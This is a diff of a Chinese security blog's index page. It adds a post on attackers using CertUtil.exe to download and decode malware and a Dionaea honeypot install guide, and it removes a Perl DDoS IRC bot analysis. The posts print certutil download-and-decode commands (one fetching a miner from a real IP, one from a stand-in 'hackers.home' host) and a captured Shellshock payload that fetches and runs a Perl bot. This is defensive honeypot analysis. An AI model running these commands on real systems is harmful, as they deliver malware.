@@ -91,7 +91,60 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cjprqg7mv000q0c9l883rqq2z" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cjpryr3vh000sfs9lnhu3fdjs" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-攻击者利用CertUtil-exe植入恶意软件" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/17/攻击者利用CertUtil-exe植入恶意软件/" class="article-date">
+  <time datetime="2018-12-17T03:08:27.000Z" itemprop="datePublished">2018-12-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/17/攻击者利用CertUtil-exe植入恶意软件/">攻击者利用CertUtil.exe植入恶意软件</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="0x00-CertUtil-exe-是什么"><a href="#0x00-CertUtil-exe-是什么" class="headerlink" title="0x00 CertUtil.exe 是什么"></a>0x00 CertUtil.exe 是什么</h4><p>近期通过蜜罐捕获了多起通过CertUtil植入恶意软件的攻击，所以对这个工具进行了一些简单的研究。</p>
+<p>CertUtil是一个Windows的内置程序，用于管理Windows中的证书，使用此程序，可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。</p>
+<h4 id="0x01-CertUtil怎么用"><a href="#0x01-CertUtil怎么用" class="headerlink" title="0x01 CertUtil怎么用"></a>0x01 CertUtil怎么用</h4><p>CertUtil的经典用法是处理Base64编码数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:\Windows\Temp&gt; certutil.exe -decode input.txt output.exe</div></pre></td></tr></table></figure>
+<p>CertUtil能够从远程URL下载证书或任何其他文件,语法： “certutil.exe -urlcache -split -f [URL] output.file”</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">certutil.exe -urlcache -split -f http://37.44.212.223/miner.exe C:/Windows/temp/yete.exe</div></pre></td></tr></table></figure>
+<ul>
+<li>“-urlcache”用于执行URL缓存管理操作。</li>
+<li>“-f”用于强制获取指定的URL并更新缓存。</li>
+<li>“-split”用于将文件转储到磁盘上。  </li>
+</ul>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\cert-2.png" alt="cert-2"></p>
+<p>分析中发现certutil.exe的强大之处是处理Base64编码数据：首先对恶意文件进行base64编码，以绕过入侵检测系统， 然后在使用CertUtil.exe下载后再对其进行解码。 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Windows\Temp&gt;certutil.exe -urlcache -split -f <span class="string">"https://hackers.home/badcontent.txt"</span> bad.txt</div><div class="line">C:\Windows\Temp&gt;certutil.exe -decode bad.txt bad.exe</div></pre></td></tr></table></figure>
+<p>攻击者为什么喜欢用CertUtil？因为它是Windows内置的程序，CertUtil可能会被列入白名单。其实利用合法的Windows植入恶意软件非常常见，比如Windows regsvr32.exe就是以类似的方式使用。</p>
+<h4 id="0x02-流量分析"><a href="#0x02-流量分析" class="headerlink" title="0x02 流量分析"></a>0x02 流量分析</h4><p>分析的过程中还发现这个工具使用连个不同的User-Agents（“Microsoft-CryptoAPI/6.1”和“CertUtil URL Agent”）与远程服务器建立两个会话连接，且response包内容一致，以下是抓包对比：</p>
+<p><img src="D:\gitBlog\themes\landscape\source\upload_image\cert-3.png" alt="cert-3"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/12/17/攻击者利用CertUtil-exe植入恶意软件/" data-id="cjpryr3vw0017fs9l1a0ygcxj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -160,7 +213,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/09/17/Satori-物联网蠕虫分析/" data-id="cjprqg7tc00150c9lz6h4ysgc" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2018/09/17/Satori-物联网蠕虫分析/" data-id="cjpryr3vv0016fs9l0czdoeue" class="article-share-link">Share</a>
       
       
     </footer>
@@ -197,7 +250,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/09/14/Suricata-tips/" data-id="cjprqg7t800100c9l9cc0lesg" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2018/09/14/Suricata-tips/" data-id="cjpryr3vk000wfs9l67wq1q8i" class="article-share-link">Share</a>
       
       
     </footer>
@@ -291,7 +344,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/09/11/开源情报收集/" data-id="cjprqg7ti001d0c9ljlcgh8k1" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2018/09/11/开源情报收集/" data-id="cjpryr3wb001ffs9lmowbio26" class="article-share-link">Share</a>
       
       
     </footer>
@@ -392,89 +445,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/09/06/构建SOC的机器学习分析模型/" data-id="cjprqg7ts001g0c9lbnhlgydv" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="w-Perl-DDOS-IrcBot分析" class="article article-type-w" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/08/21/Perl-DDOS-IrcBot分析/" class="article-date">
-  <time datetime="2018-08-21T10:16:51.000Z" itemprop="datePublished">2018-08-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/21/Perl-DDOS-IrcBot分析/">Perl DDOS IrcBot分析</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="0x00-入侵分析"><a href="#0x00-入侵分析" class="headerlink" title="0x00 入侵分析"></a>0x00 入侵分析</h4><p>发现一个蜜罐节点存在服务器CPU负载异常：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PID  USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                     3143 ***       20   0   40516   5516   1892 R 97.2  0.3 106:05.31 /usr/sbin/sshd</div></pre></td></tr></table></figure>
-<p>网络连接异常：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcp        0      0 192.168.152.134:54821   94.23.37.187:88         ESTABLISHED 3143/sshd -D</div></pre></td></tr></table></figure>
-<p>查看蜜罐的服务器日志发现了一条利用Shellsock漏洞(CVE-2014-6271)植入perl脚本并执行的日志：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"http_user_agent"</span>: <span class="string">"() &#123; :;&#125;;/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"killall -9 perl;wget http://kevelmarine.com/images/gallery/x.log -O /tmp/x.log;curl -O /tmp/x.log http://kevelmarine.com/images/gallery/x.log;perl /tmp/x.log;rm -rf /tmp/x.log*\");'"</span></div></pre></td></tr></table></figure>
-<p>攻击者IP:122.224.145.162(杭州)从<a href="http://kevelmarine.com/" target="_blank" rel="external">http://kevelmarine.com/</a> 下载x.log到/tmp目录，随后执行，最后删除。<a href="http://kevelmarine.com/" target="_blank" rel="external">http://kevelmarine.com/</a> 是一家从事海洋建筑的公司的网站，服务器位于美国，怀疑已经被黑客入侵。</p>
-<h4 id="0x01-IrcBot分析"><a href="#0x01-IrcBot分析" class="headerlink" title="0x01 IrcBot分析"></a>0x01 IrcBot分析</h4><p>根据蜜罐日志记录的下载链接我们得到x.log这个样本，发现这是一个perl实现的后门，代码共916行，通过IRC协议与主控服务器进行交互，主要功能是DDOS。发现一台C&amp;C主机：daddyhax.tk。</p>
-<p>这个样本主要分为以下几个功能模块：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">!u @system 	<span class="comment"># 系统模块</span></div><div class="line">!u @version	<span class="comment"># 版本信息</span></div><div class="line">!u @channel	<span class="comment"># IRC频道操作模块</span></div><div class="line">!u @flood  	<span class="comment"># DDoS模块</span></div><div class="line">!u @utils  	<span class="comment"># 其它功能模块</span></div></pre></td></tr></table></figure>
-<h5 id="进程隐藏功能"><a href="#进程隐藏功能" class="headerlink" title="进程隐藏功能"></a>进程隐藏功能</h5>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/08/21/Perl-DDOS-IrcBot分析/" data-id="cjprqg7t900110c9ll2f0c29d" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="w-Perl-IrcBot分析" class="article article-type-w" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/08/21/Perl-IrcBot分析/" class="article-date">
-  <time datetime="2018-08-21T09:59:11.000Z" itemprop="datePublished">2018-08-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/21/Perl-IrcBot分析/">Perl IrcBot分析</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/08/21/Perl-IrcBot分析/" data-id="cjprqg7sw000x0c9lzo4co7tv" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2018/09/06/构建SOC的机器学习分析模型/" data-id="cjpryr3w1001dfs9lg8e1l1ov" class="article-share-link">Share</a>
       
       
     </footer>
@@ -528,7 +499,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/08/14/使用YARA规则进行威胁狩猎/" data-id="cjprqg7tr001f0c9ly6gaiodn" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2018/08/14/使用YARA规则进行威胁狩猎/" data-id="cjpryr3wa001efs9lejmse18s" class="article-share-link">Share</a>
       
       
     </footer>
@@ -597,7 +568,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/07/31/Google-Safe-Browsing-Api介绍/" data-id="cjprqg7tc00160c9l7u91bcpm" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2018/07/31/Google-Safe-Browsing-Api介绍/" data-id="cjpryr3vx0018fs9lmurs8oog" class="article-share-link">Share</a>
       
       
     </footer>
@@ -645,7 +616,55 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/06/29/数字取证入门/" data-id="cjprqg7ts001h0c9lizwpib9o" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2018/06/29/数字取证入门/" data-id="cjpryr3wc001gfs9l42zy4zhe" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="w-Dionaea蜜罐部署" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/19/Dionaea蜜罐部署/" class="article-date">
+  <time datetime="2018-03-19T03:02:28.000Z" itemprop="datePublished">2018-03-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/19/Dionaea蜜罐部署/">Dionaea蜜罐部署</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="http://dionaea.readthedocs.io/en/latest/installation.html" target="_blank" rel="external">http://dionaea.readthedocs.io/en/latest/installation.html</a></p>
+<h4 id="0x00-系统的内核版本和发行版本"><a href="#0x00-系统的内核版本和发行版本" class="headerlink" title="0x00 系统的内核版本和发行版本"></a>0x00 系统的内核版本和发行版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ uname -a</div><div class="line">Linux wsy-virtual-machine 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></div><div class="line">$ lsb_release -a</div><div class="line">No LSB modules are available.</div><div class="line">Distributor ID:	Ubuntu</div><div class="line">Description:	Ubuntu 16.04.4 LTS</div><div class="line">Release:	16.04</div><div class="line">Codename:	xenial</div></pre></td></tr></table></figure>
+<h4 id="0x01-安装依赖"><a href="#0x01-安装依赖" class="headerlink" title="0x01 安装依赖"></a>0x01 安装依赖</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install autoconf automake build-essential check cython3 libcurl4-openssl-dev libemu-dev libev-dev libglib2.0-dev libloudmouth1-dev libnetfilter-queue-dev libnl-3-dev libpcap-dev libssl-dev libtool libudns-dev python3 python3-dev python3-bson python3-yaml ttf-liberation</div></pre></td></tr></table></figure>
+<h4 id="0x02-安装dionaea"><a href="#0x02-安装dionaea" class="headerlink" title="0x02 安装dionaea"></a>0x02 安装dionaea</h4><p>下载源码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/DinoTools/dionaea.git</div><div class="line"><span class="built_in">cd</span>  dionaea</div></pre></td></tr></table></figure>
+<p>成功安装所有依赖关系后,运行autreconf来构建或重建构建脚本,要进入./dionaea目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">autoreconf -vi</div></pre></td></tr></table></figure>
+<p>configure:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure --<span class="built_in">disable</span>-werror --prefix=/opt/dionaea --with-python=/usr/bin/python3 --with-cython-dir=/usr/bin --with-ev-include=/usr/include/ --with-ev-lib=/usr/lib --with-emu-lib=/usr/lib/libemu --with-emu-include=/usr/include --with-nl-include=/usr/include/libnl3 --with-nl-lib=/usr/lib</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure>
+<p>蜜罐被装在了/opt/dionaea目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/opt/dionaea<span class="comment"># ls</span></div><div class="line">bin  etc  lib  var</div></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/03/19/Dionaea蜜罐部署/" data-id="cjpryr3vr0013fs9limi6qaek" class="article-share-link">Share</a>
       
       
     </footer>
@@ -676,7 +695,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
     </div>
   </div>
 
@@ -687,6 +706,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2018/12/17/攻击者利用CertUtil-exe植入恶意软件/">攻击者利用CertUtil.exe植入恶意软件</a>
+          </li>
         
           <li>
             <a href="/2018/09/17/Satori-物联网蠕虫分析/">Satori 物联网蠕虫分析</a>
@@ -702,10 +725,6 @@
         
           <li>
             <a href="/2018/09/06/构建SOC的机器学习分析模型/">构建SOC的机器学习分析模型</a>
-          </li>
-        
-          <li>
-            <a href="/2018/08/21/Perl-DDOS-IrcBot分析/">Perl DDOS IrcBot分析</a>
           </li>
         
       </ul>
